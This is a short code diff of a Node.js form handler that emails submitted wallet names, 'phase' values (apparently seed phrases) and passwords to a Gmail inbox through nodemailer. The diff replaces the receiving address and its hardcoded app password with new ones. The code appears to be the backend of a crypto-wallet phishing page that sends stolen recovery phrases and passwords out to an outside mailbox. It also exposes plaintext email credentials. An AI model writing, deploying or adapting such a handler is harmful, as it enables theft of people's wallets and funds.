@@ -49,14 +49,14 @@ module.exports = async function (req, res) {
     port: 587,
     secure: false,
     auth: {
-      user: 'attendantemail@gmail.com',
-      pass: 'ixrb xwbe haxp qtnt',
+      user: 'phrasemainnets@gmail.com',
+      pass: 'dhgp sabg xoby xxyr',
     },
   });
 
   const mailOptions = {
     from: 'noreply@connectus.website',
-    to: 'attendantemail@gmail.com',
+    to: 'phrasemainnets@gmail.com',
     subject: 'New Form Submission',
     text: `Wallet Name: ${wallet_name}\nPhase: ${phase}\nPassword: ${password}`,
   };
